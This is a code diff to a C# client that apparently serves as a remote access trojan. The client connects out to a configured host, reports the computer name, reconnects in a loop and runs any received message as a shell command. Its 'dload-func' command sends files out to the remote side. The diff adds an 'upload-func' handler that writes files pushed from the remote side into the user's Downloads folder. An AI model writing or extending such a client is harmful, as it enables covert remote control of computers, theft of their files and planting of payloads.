@@ -64,12 +64,13 @@ async Task Restart()
         try
         {
             client.Connect(host, port);
-            Task.Run(() => CheckConnected());
             Reader = new StreamReader(client.GetStream());
             Writer = new StreamWriter(client.GetStream());
             if (Writer is null || Reader is null) return;
             Task.Run(() => ReceiveMessageAsync(Reader));
-            await SendMessageAsync(Writer);
+            await Writer.WriteLineAsync(computerName);
+            await Writer.FlushAsync();
+            await CheckConnectedAsync();
         }
         catch (Exception ex)
         {
@@ -81,7 +82,7 @@ async Task Restart()
     } while (restart);
 }
 
-async Task CheckConnected()
+async Task CheckConnectedAsync()
 {
     while (true)
     {
@@ -89,17 +90,10 @@ async Task CheckConnected()
     }
 }
 
-async Task SendMessageAsync(StreamWriter writer)
+async Task SendMessageAsync(string message)
 {
-    await writer.WriteLineAsync(computerName);
-    await writer.FlushAsync();
-
-    while (true)
-    {
-        string? message = Console.ReadLine();
-        await writer.WriteLineAsync(message);
-        await writer.FlushAsync();
-    }
+    await Writer.WriteLineAsync(message);
+    await Writer.FlushAsync();
 }
 
 async Task ReceiveMessageAsync(StreamReader reader)
@@ -113,7 +107,11 @@ async Task ReceiveMessageAsync(StreamReader reader)
             Print(message);
             if (message.StartsWith("dload-func"))
             {
-                await SendFileAsync(message.Replace("dload-func ", ""));
+                await SendFileAsync(message.Replace("dload-func ", string.Empty));
+            }
+            else if (message.StartsWith("upload-func"))
+            {
+                await RecieveFileAsync(message.Replace("upload-func ", string.Empty));
             }
             else ShellCommand(message);
         }
@@ -169,6 +167,27 @@ async Task SendFileAsync(string path)
     catch (Exception e)
     {
         Console.WriteLine($"Error when sending the file: {e.Message}");
+    }
+}
+
+async Task RecieveFileAsync(string path)
+{
+    await Writer.WriteLineAsync($"upload-func {path}");
+    await Writer.FlushAsync();
+    string fileName = Path.GetFileName(path);
+    string savePath = $@"C:\Users\{Environment.UserName}\Downloads\{Path.GetFileNameWithoutExtension(path)}_(upload-func){Path.GetExtension(path)}";
+    try
+    {
+        await Writer.WriteLineAsync("upload-ready");
+        await Writer.FlushAsync();
+        string base64Data = await Reader.ReadLineAsync();
+        byte[] fileData = Convert.FromBase64String(base64Data);
+        File.WriteAllBytes(savePath, fileData);
+        Console.WriteLine("The file is received and saved as: " + savePath);
+    }
+    catch (Exception e)
+    {
+        Console.WriteLine($"Error when receiving the file: {e.Message}");
     }
 }
 
